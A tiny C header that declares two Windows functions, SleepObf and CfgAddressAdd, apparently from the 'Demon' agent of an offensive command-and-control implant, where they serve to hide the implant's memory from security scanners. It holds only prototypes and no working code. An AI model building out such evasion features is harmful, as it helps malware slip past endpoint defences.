
#ifndef DEMON_SLEEPOBF_H
#define DEMON_SLEEPOBF_H

#include <windows.h>

#if _WIN64
VOID WINAPI CfgAddressAdd( LPVOID ImageBase, LPVOID Function );
#endif
VOID        SleepObf( );

#endif